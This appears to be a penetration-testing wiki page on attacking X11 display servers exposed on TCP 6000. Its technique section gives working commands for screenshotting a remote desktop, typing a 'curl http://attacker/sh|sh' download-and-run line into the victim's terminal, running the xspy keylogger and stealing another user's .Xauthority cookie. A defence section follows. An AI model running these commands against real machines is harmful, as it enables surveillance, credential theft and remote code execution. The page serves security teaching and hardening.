---
title: X11 Server Attacks
slug: x11-attacks
---

> **TL;DR:** An X server on TCP 6000 with `xhost +` lets any remote host read the screen, inject keystrokes, and log everything the user types — the original 1990s threat model is still shipping on lab Linux desktops.

## What it is
The X Window System separates display servers (which own the keyboard, mouse, and framebuffer) from clients (the apps). Authentication is either host-based (`xhost`) or cookie-based (`MIT-MAGIC-COOKIE-1` from `~/.Xauthority`). When a user types `xhost +` to make a quick demo work, the server happily accepts any client from anywhere, with full input and output access to every window.

## Preconditions / where it applies
- TCP/6000 + display number (6001, 6002 for additional displays)
- Modern distros disable TCP listen by default (`-nolisten tcp` in Xorg) but it is re-enabled on multi-user lab boxes, jump hosts, and some thin clients
- SSH X11-forwarding cookies on shared bastions can be stolen from `/tmp/.X11-unix` sockets
- Found on academic clusters, broadcast/editing workstations, CAD seats, and old SunRay environments

## Technique
```bash
# Scan
nmap -p 6000-6005 --script x11-access 10.0.0.60

# Quick smoke test — only works with xhost + or stolen cookie
xdpyinfo -display 10.0.0.60:0

# Screenshot the remote desktop
xwd -display 10.0.0.60:0 -root -out screen.xwd
convert screen.xwd screen.png

# Inject keystrokes — spawn a shell in whatever terminal is focused
DISPLAY=10.0.0.60:0 xdotool key ctrl+alt+t
DISPLAY=10.0.0.60:0 xdotool type --delay 50 'curl http://attacker/sh|sh'
DISPLAY=10.0.0.60:0 xdotool key Return

# Keylogger
git clone https://github.com/magnumripper/xspy && cd xspy && make
./xspy -display 10.0.0.60:0

# Cookie theft on a shared host
cp /home/victim/.Xauthority /tmp/x && DISPLAY=:10 XAUTHORITY=/tmp/x xdotool key Return
```

## Detection and defence
- Run Xorg with `-nolisten tcp` (default on Debian, Fedora, Ubuntu since 2018)
- Use Wayland where possible — there is no equivalent global input bus
- For SSH X11 forwarding prefer `ForwardX11Trusted no` so the SECURITY extension caps capabilities
- Never `xhost +` — use `xauth add` with a per-session cookie instead
- Monitor for unexpected TCP listens on 6000-6005 with `ss -tlnp`

## References
- [X.Org security advisory archive](https://www.x.org/wiki/Development/Security/) — protocol-level CVEs
- [Wayland portability FAQ](https://wayland.freedesktop.org/faq.html) — why Wayland blocks global input capture

See also: [[exposed-services]], [[port-scanning]].
